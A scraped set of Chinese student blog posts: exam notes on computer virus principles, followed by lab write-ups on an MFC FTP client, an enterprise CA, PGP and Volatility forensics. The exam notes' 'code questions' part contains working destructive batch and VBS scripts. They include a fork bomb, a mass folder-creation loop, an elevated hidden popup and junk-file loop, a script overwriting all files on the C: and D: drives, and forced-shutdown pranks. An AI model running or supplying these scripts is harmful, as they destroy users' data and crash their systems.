查看noraml.dot，用原文件覆盖被感染的 防止病毒入侵的原则、方式是什么？原则： 主动防御为主，结合被动处理，阻塞传播。 防止外界计算机病毒向机内传染；抑制现有计算机病毒向外传染 对已知病毒的预防 对未来病毒的预防 方式： 将大量杀毒软件汇集一起，检查是否存在已知计算机病毒。 检测一些病毒经常改变的系统信息，引导区、中断向量表、可用内存空间等，已确定是否存在病毒 检测写盘操作，对引导区、主引导区的写操作报警。 对文件形成一个密码检验码和程序完整性的验证。 智能判断型：设定病毒行为判定库 智能监察型：设计病毒特征库、行为知识库等 计算机病毒要达到的最终目标是什么?破坏系统、数据丢失、数据密级异常、网络瘫痪 复合型病毒是什么？复合型病毒同时具有多种病毒特征，文件型和引导型的某些特点，或者恶意代码通过多种方式传播等。 依附在可执行文件上，当作载体进行传播，当运行时，系统中有硬盘，则立即感染主引导区，以后用硬盘启动系统时，就有该病毒。 做法：将硬盘主引导区内病毒清除；记录执行程序的起始地址，终止地址，清除病毒代码。将文件长度改为清毒后的长度。 传播途径：电子邮件、web服务器、web终端、网络共享等 文件型病毒感染的是哪一类文件？扩展名为COM、EXE、SYS、BAT可执行文件。 清除病毒的方法有哪些？ 清除被感染文件 删除病毒文件 禁止访问病毒文件 病毒删除后移到隔离区 不知道是不是病毒时，不处理 一个移动硬盘被感染了，对它做怎样的处理？ 用反病毒软件清除病毒或者在无毒计算机格式化该盘 病毒删除后移到隔离区 禁止主机访问病毒文件 给一个状态，要判断是不是中了病毒？发作特征； 计算机无法启动 计算机经常死机 文件无法打开 系统提示内存不足 磁盘空间不足 数据突然丢失 系统运行速度慢 键盘、鼠标锁死 系统增加大量来历不明的文件 自动加载某些程序 计算机病毒危害是什么？ 对数据信息直接破坏，删除或修改文件和数据。 非法占用磁盘空间，对磁盘数据破坏，造成数据丢失。 将非法数据写DOS内存参数区，引起系统崩溃。 抢占系统资源，干扰系统运行，影响运行速度 脚本病毒的特点？使用script代码编写的具有恶意操作意向的程序代码。易用。 编写简单 破坏力大 感染力强 传播范围大 病毒源码易被获取、变种多 欺骗性强 使计算机病毒生产机实现起来很容易 蠕虫病毒的特征？蠕虫病毒是自包含的程序，能传播自身功能的复件或某些部分到系统中。 通过网络传播的。 主动攻击：无需干预即可运行的攻击程序或代码。 独立程序：不利用文件寄生。 对网络造成拒绝服务 短时间内蔓延网络，造成瘫痪 木马有哪些种类？ 破坏型 密码发送型 远程访问型 键盘记录木马 DOS攻击 代理木马 FTP木马 程序杀手 反弹端口 病毒检测，启发式杀毒技术是什么（静态、动态）？依据病毒和正常程序之间存在的区别，应用在查杀程序中。“启发”是自我发现的能力，或运用某种方式或方法判定事物的知识和技能。 动态：是以人工智能的方式实现动态反编译代码分析。用debug等程序调试工具，在内存带毒的情况下，动态跟踪，观察工作过程。在静态的基础上，进一步分析 静态：用反汇编程序处理，对程序清单进行分析。将文件感染过程翻转为清除病毒、修复文件。分析可用作特征码的部分等。在静止状态下通过病毒的典型指令特征识别病毒的方法，是对传统特征码扫描的一种补充。 计算机病毒程序的典型组成有哪些模块计算机病毒程序的典型组成包括引导模块、传染模块和表现模块 CIH？ “CIH”计算机病毒属于文件型病毒，别名“win95.CIH”，“Spacefiller”，“Win32.CIH”，“PE_CIH”等。 主要感染Windows 95&#x2F;98操作系统下的可执行程序。 能够破坏计算机系统硬件，发作时破坏硬盘数据，同时有可能破坏BIOS程序。 依附在其他程序上面，通过网络传播。 防火墙是什么，功能，对它的要求?防火墙：防火墙是网络安全的屏障，由软件和硬件组合而成，处于企业或网络群体计算机与外界通道之间。限制外部对内部的访问。防止非法用户的入侵 功能： 提高内部网络安全性 强化网络安全策略 对网络存取和访问进行监控审计 提供网络使用情况的统计数据 要求： 发生可疑事件进行报警，和攻击详情 能记录访问并作出日志记录 实现内部网络重点网段的隔离 病毒防火墙： 对系统实施实时监控，对流入流出系统的数据中可能含有的病毒代码进行过滤。 能有效的阻止病毒从网络向本机系统入侵。 双向过滤，保证本机不会向网络传播病毒。 怎么检测计算机病毒，检测方法是什么？ 借助简单工具：debug等，检测者阅读 借助专用工具：norton等，能自动扫描 外观检测法：看计算机是否有明显异常，如屏幕异常、系统变慢等 特征代码法：与特征码库进行对比 系统数据对比法：看有无意外坏簇。检查中断向量等。 实时监控法：监视行为，有异常就及时报警 软件模拟法：专用来检测变形病毒。是一种软件分析器，模拟一个程序运行环境，将程序载入其中，看他造成的后果 计算机病毒一般分为 引导型、文件型。它们俩的原理是什么？引导型：改写磁盘上的引导区中的内容，或改写分区表。利用操作系统的引导模块放在某个固定位置，并且控制权转交方式是基于物理地址，所以病毒占据该物理位置即可获得控制权。执行病毒后，再把控制权转交给引导区。 文件型：主要感染可执行程序。需要借助于载体。可以把病毒的程序码复制到宿主文件的开头或结尾。 常驻于内存。 代码题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596971.桌面上创建记事本，改后缀为bat::输入以下代码%0|%0保存后退出，打开会发现无限制的弹窗。这是什么原理呢？执行脚本的时候，|管道符会将左面的值传给右边，而这里%0是第一个参数（批处理路径），所以会无限执行自己。2桌面上创建记事本，改后缀为bat::输入以下代码for /l %%i in (1 1 999999) do md A..\\这个病毒利用Windows命名漏洞，创建999999个删除不了也打不开的文件夹。解决方法：把md改为rd3桌面上创建记事本，改后缀为bat@%1 mshta vbscript:CreateObject(&quot;Shell.Application&quot;).ShellExecute(&quot;cmd.exe&quot;,&quot;/c %~s0 ::&quot;,&quot;&quot;,&quot;runas&quot;,0)(window.close)&amp;&amp;exit:aset /a a+=1echo %random%-%random%-%random% &gt; C:\\Users\\%username%\\Desktop\\病毒文件.%random%mshta javascript:alert(&quot;您已中第%a%个病毒.&quot;);close();goto a这个病毒会在后台运行，在桌面重复弹信息框，生成垃圾文件，千万不敢随意测试，因为电脑会消耗尽内存后蓝屏。4这种病毒最有破坏性，跟熊猫烧香媲美。同样，桌面上创建记事本，改后缀为bat@%1 mshta vbscript:CreateObject(&quot;Shell.Application&quot;).ShellExecute(&quot;cmd.exe&quot;,&quot;/c %~s0 ::&quot;,&quot;&quot;,&quot;runas&quot;,0)(window.close)&amp;&amp;exitfor /f &quot;tokens=* delims=&quot; %%i in (&#x27;dir /b D:\\*.*&#x27;) do copy /y &quot;%dpnx0&quot; &quot;%%i&quot; &gt;nulfor /f &quot;tokens=* delims=&quot; %%i in (&#x27;dir /b C:\\*.*&#x27;) do copy /y &quot;%dpnx0&quot; &quot;%%i&quot; &gt;nul此程序特别狠，会在后台把C、D盘所有的文件都替换成自己（病毒文件，然后会又被执行）。5 创建记事本，后缀改为VBS=======分割线=======on error resume nextdim WSHshellAset WSHshellA = wscript.createobject(&quot;wscript.shell&quot;)WSHshellA.run &quot;cmd.exe /c shutdown -r -t 120 -c &quot;&quot;说我是猪，不说我是猪就两分钟关你机，不信，你试试···&quot;&quot; &quot;,0 ,truedim ado while(a &lt;&gt; &quot;我是猪&quot;)a = inputbox (&quot;说我是猪,就不关机，说 &quot;&quot;我是猪&quot;&quot; &quot;,&quot;说不说&quot;,&quot;你写啊&quot;,8000,7000)msgbox chr(13) + chr(13) + chr(13) + a,0,&quot;MsgBox&quot;loopmsgbox chr(13) + chr(13) + chr(13) + &quot;早说就行了嘛,呵呵，爽&quot;dim WSHshellset WSHshell = wscript.createobject(&quot;wscript.shell&quot;)WSHshell.run &quot;cmd.exe /c shutdown -a&quot;,0 ,truemsgbox chr(13) + chr(13) + chr(13) + &quot;哈哈哈哈，真过瘾&quot;WScript.Echo(&quot;喜欢吗，快点点赞（Y Y）&quot;)a = inputbox (&quot;赞不赞，说赞就解除，不说就不解 &quot;&quot;赞&quot;&quot; &quot;,&quot;赞不赞&quot;,&quot;赞吗&quot;,8000,7000)msgbox chr(13) + chr(13) + chr(13) + a,0,&quot;MsgBox&quot;loopdomsgbox chr(13) + chr(13) + chr(13) + &quot;呵呵，爽死了&quot;另存.VBS6@echo offecho Message here.shutdown -s -f -t 60 -c &quot;此处键入您要显示的消息。&quot;","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"病毒原理","slug":"期末考试/病毒原理","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E7%97%85%E6%AF%92%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"MFC WinInet类实现FTP客户端","slug":"MFC-WinInet类实现FTP客户端","date":"2020-12-09T18:15:26.000Z","updated":"2024-11-12T06:59:27.000Z","comments":true,"path":"2020/12/10/MFC-WinInet类实现FTP客户端/","permalink":"https://gryffinbit.top/2020/12/10/MFC-WinInet%E7%B1%BB%E5%AE%9E%E7%8E%B0FTP%E5%AE%A2%E6%88%B7%E7%AB%AF/","excerpt":"","text":"本次实验的工程文件下载：https://gryffinbit.lanzous.com/idK4Hj7kb4b 实验目标程序能实现基本的 FTP 客户机端功能，能登录 FTP 服务器，显示登录客户机目录下的文件和 目录名，能从该目录中选择下载服务器的文件，也能向服务器上传文件。 实验目的 学习如何创建一个 Internet 会话，即创建 CInternetSession 对象; 学习如何建立与 FTP 服务器的连接， 即创建 CFtpConnection 对象;如果连接成功，如何获得当前登录的目录下的文件和目录名称，即 检索一个目录下的文件，并显示文件信息;如何下载文件、上传文件以及关闭连接。 实验环境Windows10 x64，Visual Studio 2017 实验内容应用程序的类型是基于对话框的。 对话框中包括三个文本框，分别用于输入 FTP 服务器域名、登录用户名和登录口令;一个列 表框，用来显示 FTP 服务器当前目录的内容，并允许用户从中选择文件下载;四个命令按钮，分 别执行查询、上传、下载和退出的操作。 实验原理（模型）WinInet 类编程的一般步骤如下。 (1)创建 CInternetSession 类对象，创建并初始化 Internet 会话。 (2)利用 CInternetSession 类的 QueryOption 或 SetOption 成员函数，可以查询或设置该类内 含的 Internet 请求选项，这一步是可选的，不需要可以不做。 (3)创建连接类对象，建立 CInternetSession 对象与网络服务器的连接，也就是应用程序与网 络服务器的连接。只需要分别调用 CInternetSession 类的 GetFtpConnection、GetHttpConnection 或 GetGopherConnection 函数就可以轻松地创建 CFtpConnection 类、CHttpConnection 类或 CGopher Connection 类的对象实例。再使用这些对象实例的成员函数就能完成很多对于网络服务器的操作。 例如，对于 FTP 服务器，可以获知或设置当前目录，下载或上传文件，创建或删除目录，重命名 文件或目录等。 (4)创建文件检索类对象，对服务器进行检索。 (5)如果需要使用异步操作模式，可以重载 CInternetSession 类的 OnStatusCallback 函数，并 启动应用程序，使用状态回调机制，重载相关函数，加入自己的代码。 (6)如果还想更紧密地控制对服务器文件的访问，可以进一步创建文件类对象实例，完成文 件查找或文件读写操作。 (7)创建 CInternetException 类对象实例，处理错误。 (8)关闭各种类，将资源释放给系统。 实验过程1.使用 MFC AppWizard 创建应用程序框架应用程序类:CFtpApp，对应的文件是 Ftp.h 和 Ftp.cpp。 对话框类:CFtpDlg，对应的文件是 FtpDlg.h 和 FtpDlg.cpp。 2.为对话框添加控件 3.定义控件的成员变量 4.添加成员变量的初始化代码在 FtpDlg.cpp 文件的 OnInitDialog( )函数中添加成员变量的初始化代码。对服务器名、登录用户名和登录口令的控件变量赋初值。 1234567// TODO: 在此添加额外的初始化代码 m_strFtp = _T(&quot;&quot;); m_strName = _T(&quot;&quot;); m_strPwd = _T(&quot;&quot;); m_strPwd = _T(&quot;&quot;); UpdateData(FALSE); return TRUE; // 除非将焦点设置到控件，否则返回 TRUE 5.为对话框中的控件对象添加事件响应函数 6.为 CFtpDlg 类添加其他的成员函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102BOOL CFtpDlg::Download(CString strSName, CString strDName)&#123; // TODO: 在此处添加实现代码. CInternetSession* pSession; //定义会话对象变量指针 CFtpConnection* pConnection; //定义连接对象变量指针 pConnection = NULL; //创建Internet会话对象 pSession = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS); try &#123; //建立FTP连接 pConnection = pSession-&gt;GetFtpConnection(m_strFtp, m_strName, m_strPwd); &#125; catch (CInternetException* e) &#123; //错误处理 e-&gt;Delete(); pConnection = NULL; return FALSE; &#125; if (pConnection != NULL) &#123; //下载文件 if (!pConnection-&gt;GetFile(strSName, strDName)) &#123; //下载文件错误 pConnection-&gt;Close(); delete pConnection; delete pSession; return FALSE; &#125; &#125; //清除对象 if (pConnection != NULL) &#123; pConnection-&gt;Close(); delete pConnection; &#125; delete pSession; return TRUE;&#125;BOOL CFtpDlg::Upload(CString strSName, CString strDName)&#123; // TODO: 在此处添加实现代码. CInternetSession* pSession; CFtpConnection* pConnection; pConnection = NULL; //创建Internet会话 pSession = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS); try &#123; //建立FTP连接 pConnection = pSession-&gt;GetFtpConnection(m_strFtp, m_strName, m_strPwd); &#125; catch (CInternetException* e) &#123; //错误处理 e-&gt;Delete(); pConnection = NULL; return FALSE; &#125; if (pConnection != NULL) &#123; //上传文件 if (!pConnection-&gt;PutFile(strSName, strDName)) &#123; //上传文件错误 pConnection-&gt;Close(); delete pConnection; delete pSession; return FALSE; &#125; &#125; //清除对象 if (pConnection != NULL) &#123; pConnection-&gt;Close(); delete pConnection; &#125; delete pSession; return TRUE;&#125; 7.手工添加包含语句在 CFtpDlg 类的 FtpDlg.cpp 文件中添加对于 Afxinet.h 的包含命令，来获得对于 MFC WinInet 类的支持。 8.添加事件函数和成员函数的代码FTP.h 123456789101112131415161718192021222324252627282930313233// Ftp.h: PROJECT_NAME 应用程序的主头文件//#pragma once#ifndef __AFXWIN_H__ #error &quot;include &#x27;pch.h&#x27; before including this file for PCH&quot;#endif#include &quot;resource.h&quot; // 主符号// CFtpApp:// 有关此类的实现，请参阅 Ftp.cpp//class CFtpApp : public CWinApp&#123;public: CFtpApp();// 重写public: virtual BOOL InitInstance();// 实现 DECLARE_MESSAGE_MAP()&#125;;extern CFtpApp theApp; FTP.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// Ftp.cpp: 定义应用程序的类行为。//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;Ftp.h&quot;#include &quot;FtpDlg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// CFtpAppBEGIN_MESSAGE_MAP(CFtpApp, CWinApp) ON_COMMAND(ID_HELP, &amp;CWinApp::OnHelp)END_MESSAGE_MAP()// CFtpApp 构造CFtpApp::CFtpApp()&#123; // 支持重新启动管理器 m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART; // TODO: 在此处添加构造代码， // 将所有重要的初始化放置在 InitInstance 中&#125;// 唯一的 CFtpApp 对象CFtpApp theApp;// CFtpApp 初始化BOOL CFtpApp::InitInstance()&#123; // 如果一个运行在 Windows XP 上的应用程序清单指定要 // 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式， //则需要 InitCommonControlsEx()。 否则，将无法创建窗口。 INITCOMMONCONTROLSEX InitCtrls; InitCtrls.dwSize = sizeof(InitCtrls); // 将它设置为包括所有要在应用程序中使用的 // 公共控件类。 InitCtrls.dwICC = ICC_WIN95_CLASSES; InitCommonControlsEx(&amp;InitCtrls); CWinApp::InitInstance(); AfxEnableControlContainer(); // 创建 shell 管理器，以防对话框包含 // 任何 shell 树视图控件或 shell 列表视图控件。 CShellManager *pShellManager = new CShellManager; // 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题 CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows)); // 标准初始化 // 如果未使用这些功能并希望减小 // 最终可执行文件的大小，则应移除下列 // 不需要的特定初始化例程 // 更改用于存储设置的注册表项 // TODO: 应适当修改该字符串， // 例如修改为公司或组织名 SetRegistryKey(_T(&quot;应用程序向导生成的本地应用程序&quot;)); CFtpDlg dlg; m_pMainWnd = &amp;dlg; INT_PTR nResponse = dlg.DoModal(); if (nResponse == IDOK) &#123; // TODO: 在此放置处理何时用 // “确定”来关闭对话框的代码 &#125; else if (nResponse == IDCANCEL) &#123; // TODO: 在此放置处理何时用 // “取消”来关闭对话框的代码 &#125; else if (nResponse == -1) &#123; TRACE(traceAppMsg, 0, &quot;警告: 对话框创建失败，应用程序将意外终止。\\n&quot;); TRACE(traceAppMsg, 0, &quot;警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\\n&quot;); &#125; // 删除上面创建的 shell 管理器。 if (pShellManager != nullptr) &#123; delete pShellManager; &#125;#if !defined(_AFXDLL) &amp;&amp; !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS) ControlBarCleanUp();#endif // 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序， // 而不是启动应用程序的消息泵。 return FALSE;&#125; FtpDlg.h 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// FtpDlg.h: 头文件//#pragma once// CFtpDlg 对话框class CFtpDlg : public CDialogEx&#123;// 构造public: CFtpDlg(CWnd* pParent = nullptr); // 标准构造函数// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_FTP_DIALOG &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: HICON m_hIcon; // 生成的消息映射函数 virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: CStatic m_staFtp; CStatic m_staName; CStatic m_staPwd; CEdit m_editFtp; CString m_strFtp; CEdit m_editName; CString m_strName; CEdit m_editPwd; CString m_strPwd; CButton m_btnQuery; CButton m_btnDownload; CButton m_btnUpload; CListBox m_listFile; afx_msg void OnQuery(); afx_msg void OnDownload(); afx_msg void OnUpload(); afx_msg void OnSelchangeListFile(); BOOL Download(CString strSName, CString strDName); BOOL Upload(CString strSName, CString strDName);&#125;; ftpDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102BOOL CFtpDlg::Download(CString strSName, CString strDName)&#123; // TODO: 在此处添加实现代码. CInternetSession* pSession; //定义会话对象变量指针 CFtpConnection* pConnection; //定义连接对象变量指针 pConnection = NULL; //创建Internet会话对象 pSession = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS); try &#123; //建立FTP连接 pConnection = pSession-&gt;GetFtpConnection(m_strFtp, m_strName, m_strPwd); &#125; catch (CInternetException* e) &#123; //错误处理 e-&gt;Delete(); pConnection = NULL; return FALSE; &#125; if (pConnection != NULL) &#123; //下载文件 if (!pConnection-&gt;GetFile(strSName, strDName)) &#123; //下载文件错误 pConnection-&gt;Close(); delete pConnection; delete pSession; return FALSE; &#125; &#125; //清除对象 if (pConnection != NULL) &#123; pConnection-&gt;Close(); delete pConnection; &#125; delete pSession; return TRUE;&#125;BOOL CFtpDlg::Upload(CString strSName, CString strDName)&#123; // TODO: 在此处添加实现代码. CInternetSession* pSession; CFtpConnection* pConnection; pConnection = NULL; //创建Internet会话 pSession = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS); try &#123; //建立FTP连接 pConnection = pSession-&gt;GetFtpConnection(m_strFtp, m_strName, m_strPwd); &#125; catch (CInternetException* e) &#123; //错误处理 e-&gt;Delete(); pConnection = NULL; return FALSE; &#125; if (pConnection != NULL) &#123; //上传文件 if (!pConnection-&gt;PutFile(strSName, strDName)) &#123; //上传文件错误 pConnection-&gt;Close(); delete pConnection; delete pSession; return FALSE; &#125; &#125; //清除对象 if (pConnection != NULL) &#123; pConnection-&gt;Close(); delete pConnection; &#125; delete pSession; return TRUE;&#125; 9.进行测试 需要先在本机开启FTP服务器 filezilla sever开启FTP服务。 下载链接： https://gryffinbit.lanzous.com/i5ISij3kh6f 安装后，点击edit，setting进行基本配置。14147为默认端口 在filezilla设置用户端。 添加一个用户。 在服务器域名文本框中输入“localhost”，保持登录用户名和口令与刚刚创建的用户一致，单击“查询”按钮，用户将获得 FTP 服务器的默认目录下的文件名和目录名。 实验界面结果展示界面显示： 下载文件： 实验过程中遇到的问题字符问题，在字符串前面，加上_T 1strFileName = _T(&quot;[&quot; )+ strFileName + _T(&quot;]&quot;);","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"网络编程","slug":"实验/网络编程","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"WinInet","slug":"WinInet","permalink":"https://gryffinbit.top/tags/WinInet/"},{"name":"MFC","slug":"MFC","permalink":"https://gryffinbit.top/tags/MFC/"}],"author":"Gryffinbit"},{"title":"企业根CA的安装和使用","slug":"企业根CA的安装和使用","date":"2020-12-07T14:48:02.000Z","updated":"2024-11-12T07:00:07.000Z","comments":true,"path":"2020/12/07/企业根CA的安装和使用/","permalink":"https://gryffinbit.top/2020/12/07/%E4%BC%81%E4%B8%9A%E6%A0%B9CA%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/","excerpt":"","text":"企业根CA的安装和使用实验目的： 理解CA认证原理及其结构 掌握Windows Server2003环境下企业根证书安装和使用 实验目标： 通过网络安全技术实验认识网络安全技术的基本概念、原理和技术，掌握基本的网络安全常用工具的使用方法及原理。加深对课堂理论教学的理解。 培养实验技能、动手能力和分析问题、解决问题的能力。 实验内容： 企业根CA的安装 Web方式申请和安装证书 实验原理： 数字证书概念 将用户身份ID与其所持有的公钥PK绑定，再由CA对该身份及对应公钥的组合{ID||PK}进行数字签名得到S，将{签名S||身份ID||公钥PK}加以存储。 CA证书机构 负责发放和管理数字证书 跟踪证书状态 在证书需要撤销时发布证书撤销通知 维护证书档案和证书相关的审计。 实验环境：宿主机： macOS Catalina 虚拟机：Windows Sever 2003 实验过程： 一：企业根CA的安装 👉启动Active Directory 用户和计算机项 👉挂载IOS镜像 在虚拟机的选项中，选择IOS镜像并连接 👉安装IIS服务 👉添加证书服务 控制面板 → 添加或删除程序 → Windows组件服务 → 开启证书服务 填入CA要求的信息 👉查看证书颁发机构，启动&#x2F;停止证书服务 二、Web方式申请和安装证书 👉Server上面开启浏览器 访问网址的时候，根据提示，一步步设置 输入本机的用户名和密码，进行连接配置 👉访问网页，自动颁发证书 网页访问http:&#x2F;&#x2F;本机IP&#x2F;certsrv 申请一个证书→ 用户证书 → 提交 → 获得证书 👉安装和查看证书 打开控制台 → mmc → 文件 → 添加&#x2F;删除管理单元 → 添加证书 查看证书信息 三、Web服务器证书的申请和安装 👉配置Web服务器 管理工具 → Internet信息管理 → IIS 👉新建网站 右键网站（注意IP地址，读写权限） 👉Web证书服务导向 右键属性 → 目录安全性 → 证书服务器 → 新建证书","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"网络安全技术","slug":"实验/网络安全技术","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"CA","slug":"CA","permalink":"https://gryffinbit.top/tags/CA/"},{"name":"证书","slug":"证书","permalink":"https://gryffinbit.top/tags/%E8%AF%81%E4%B9%A6/"}],"author":"Gryffinbit"},{"title":"使用PGP进行公钥体制的通信","slug":"使用PGP进行公钥体制的通信","date":"2020-12-06T16:55:13.000Z","updated":"2024-11-12T07:00:05.000Z","comments":true,"path":"2020/12/07/使用PGP进行公钥体制的通信/","permalink":"https://gryffinbit.top/2020/12/07/%E4%BD%BF%E7%94%A8PGP%E8%BF%9B%E8%A1%8C%E5%85%AC%E9%92%A5%E4%BD%93%E5%88%B6%E7%9A%84%E9%80%9A%E4%BF%A1/","excerpt":"","text":"加密综合实验实验附件下载地址：https://gryffinbit.lanzous.com/i5ISij3kh6f 实验目的： 掌握加解密的原理和公钥体制。 了解PGP软件的功能与使用。 掌握PGP的加密原理。 实验环境：VMware Win10虚拟机 实验过程与步骤：一、PGP加密软件的安装​ 二、生成密钥 要使用该软件进行加密的话，首先要生成一对密钥。也就是一个公钥和一个私钥。其中公钥是发送给别人用来加密钥发送给自己的文件的，私钥是自己保存，用于解密别人用公钥加密的文件，或者起数字签名的作用。 PGP有很好的创建密钥对的向导，跟着向导很容易生成一对密钥。每一对密钥都对应着一个确定的用户。用户名不一定要真实，但是要方便通信者看到该用户名能知道这个用户名对应的真实的人；邮件地址也是一样不需要真实，但是要能方便与你通信的人在多个公钥中快速的找出你的公钥。 密钥对的私钥还必须进一步用密码加密，这个加密是对你的私钥加密。这个密码非常重要，切记不要泄漏了，为安全起见，密码长度至少8位，而且应该包含非字母的字符。 ​ ​ 三、导出并发送公钥现在将这个密钥导出，在这个密钥上右击选择“Export…”，出现如下界面： ​ 导出密钥后，把密钥文件保存在硬盘上，并把公钥文件发送到一个“公钥管理”文件夹（例如QQ群文件中建一个公钥管理文件夹），大家的公钥整理后都放在这个夹里。 注意：如果想同时导出公钥和私钥，就把“Include Private Key（s）”选上。如果只想导出公钥给别人加密使用，千万不能选上。 四、文件加密与解密 若karlie想给Lichunquan发送加密文件，则从“公钥管理”文件夹获取LiChunquan的公钥，即LiChunquan.asc，放到指定的位置，然后双击这个公钥文件，点击“Import”，即将这个文件导入到密钥盘上。 Karlie用Lichunquan的公钥将一个文件加密,例如文件“Text.txt”，方法如下： 在菜单栏左侧，选择PGPZIP→ 建立新的项目 ​ → 将需要加密的文件拖入 ​ →选择Lichunquan的公钥 ​ → 进行加密和签名 ​ → 加密完成后得到text.txt.pgp 文件 Karlie通过通信软件，将加密文件“text.txt.pgp”发送给Lichunquan。 Lichunquan收到文件后，利用自己的私钥将文件解密。 五、数字签名 对文件签名只能证明是你发出该文件，但是文件的内容并没有被加密，同时，进行数字签名时，关注的是表明该文件是从自己这里发出，因此对于文件的内容并不在意被别人看到，经过数字签名的文件要同原明文文件一同发送给对方，对方才能验证数字签名是否有效。 数字签名（digital signature）是公钥密码的逆应用：用私钥加密消息，用公钥解密消息。 用私钥加密的消息称为签名，只有拥有私钥的用户可以生成签名。用公钥解密签名这一步称为验证签名，所有用户都可以验证签名(因为公钥是公开的) 在菜单栏左侧，选择PGPZIP→ 建立新的项目 → 将需要签名的文件拖入 ​ → 选择sign only，只进行签名 ​ → 用自己的私钥进行签名 → 获得签名文件“text.txt.sig“ ​ Karlie通过通信软件，将原文件“text.txt”和签名文件“text.txt.sig”发送给LiChunquan。 LiChunquan从“公钥管理”文件夹获取Karlie的公钥，即lijingyi.asc，然后双击这个公钥文件，点击“Import”，即将这个文件导入到密钥盘上。 → 导入Karlie的公钥以后，打开PGP Desktop，选择“All Keys” →右键单击“Karlie”→选择“Sign”（使“Karlie”的“Verified”状态变为“✔”）。 → LiChunquan将两个文件放在同一目录下，双击签名文件“text.txt.sig”即可验证签名。","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"密码学","slug":"实验/密码学","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"PGP","slug":"PGP","permalink":"https://gryffinbit.top/tags/PGP/"},{"name":"公钥体制","slug":"公钥体制","permalink":"https://gryffinbit.top/tags/%E5%85%AC%E9%92%A5%E4%BD%93%E5%88%B6/"}],"author":"Gryffinbit"},{"title":"kali下volatility取证工具的使用","slug":"kali下volatility取证工具的使用","date":"2020-12-05T18:20:24.000Z","updated":"2024-11-12T06:59:31.000Z","comments":true,"path":"2020/12/06/kali下volatility取证工具的使用/","permalink":"https://gryffinbit.top/2020/12/06/kali%E4%B8%8Bvolatility%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Kali下 volatility取证软件的使用实验所用附件下载https://gryffinbit.lanzous.com/b01bwm4ab密码:15j0 实验环境：Debian 8 kali 实验要求：使用Volatility 取证软件从内存转储文件中获取有用信息，包括: 查看内存镜像中进程列表 查看内存镜像中注册表信息 获取用户名和用户登陆密码 查看转储前都运行了哪些程序 把某个程序的相关数据转储成-一个文件，对这个文件进行进一步分析 提取目标系统的命令行历史 提取目标系统的网络连接情况 提取目标系统的使用IE浏览器访问网络情况 实验内容： 首先使用内容转储软件dumpit在Windows7虚拟机(目标系统)中将内存中所有信息转储为-一个文件。 将转储生成的文件拷贝到Kali系统中进行分析。 实验过程：volatility官方文档 https://github.com/volatilityfoundation/volatility/wiki/Installation 基本依赖包及环境配置 👉下载volatility git clone [https://github.com/volatilityfoundation/volatility.git](https://github.com/volatilityfoundation/volatility.git) 解压该压缩包，cd到文件夹位置，运行安装脚本 python [setup.py](http://setup.py) build python [setup.py](http://setup.py) install 用法 123cd /root/volatility/chmod +x vol.py./vol.py 缺少依赖包 👉pip 安装缺少的依赖包 12345sudo pip install yarapip install distorm3==3.4.4sudo pip install pycrypto sudo pip install openpyxl sudo pip install Pillow 内存工具Dump的使用 👉进行转储 👉制备实验用的转储文件 在目标系统中打开一些应用程序，例如：记事本 使用kali分析转储生成的文件 👉查看帮助文档 👉分析系统信息 